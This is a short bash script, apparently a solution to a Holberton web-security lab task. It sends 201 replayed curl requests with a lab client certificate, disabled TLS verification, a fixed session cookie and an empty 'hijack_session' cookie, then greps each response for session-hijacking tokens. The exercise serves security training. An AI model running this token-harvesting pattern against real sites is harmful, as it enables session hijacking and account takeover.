#!/bin/bash

for i in {0..200}; do
	curl --cert-type P12 --cert web0x02.p12:holberton --path-as-is -i -s -k -X $'GET' \
	    -H $'Host: web0x02.hbtn' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Linux\"' -H $'Accept-Language: en-US,en;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://web0x02.hbtn/task4/' -H $'Accept-Encoding: gzip, deflate, br' -H $'Priority: u=0, i' -H $'Connection: keep-alive' \
	    -b $'session=8_ZHRtmXGWHLYbvUfPV3u4cFNBKZLpyXvwTzOSrS0gM.ev7GCcdKDnxT10gOP5Ls57f1vlk; hijack_session=' \
	    $'https://web0x02.hbtn/task5/' | grep -i hijack
done
